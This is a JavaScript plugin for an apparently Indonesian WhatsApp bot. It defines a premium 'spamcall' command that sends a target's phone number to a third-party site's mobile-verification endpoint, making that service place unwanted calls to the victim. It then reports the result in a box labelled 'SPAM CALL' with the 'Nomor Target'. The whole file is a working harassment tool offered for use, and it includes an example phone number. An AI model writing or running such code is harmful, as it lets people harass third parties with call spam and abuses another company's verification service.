import fetch from 'node-fetch';

let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) throw `Masukkan nomor tujuan!\n\nContoh:\n*${usedPrefix + command} 085874068202* atau *6285874068202*`;
    let nomor = text.replace(/[^0-9]/g, '');
    if (nomor.startsWith('62')) nomor = nomor.slice(2);
    else if (nomor.startsWith('0')) nomor = nomor.slice(1);

    if (!nomor.startsWith('8')) throw `Nomor tidak valid! Pastikan diawali dengan 08 atau 628.`;

    await m.reply('Sedang memproses permintaan panggilan...');
    try {
        let res = await fetch(`https://id.jagreward.com/member/verify-mobile/${nomor}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
            }
        });
        let anu = await res.json();
        let spcall = `╭──── 〔 *SPAM CALL* 〕 ─⬣
│ 📞 *Nomor Target* : +62${nomor}
│ 🤖 *Prefix Bot*   : ${anu.phone_prefix || '-'}
│ 📢 *Status*       : ${anu.result || 'Berhasil diproses!'}
╰────────────────────────⬣`;
        m.reply(spcall);
    } catch (e) {
        m.reply(`Gagal melakukan spamcall: ${e.message || e}`);
    }
};

handler.help = ['spamcall <nomor>'];
handler.tags = ['tools', 'premium'];
handler.command = /^(spamcall)$/i;
handler.premium = true;

export default handler;
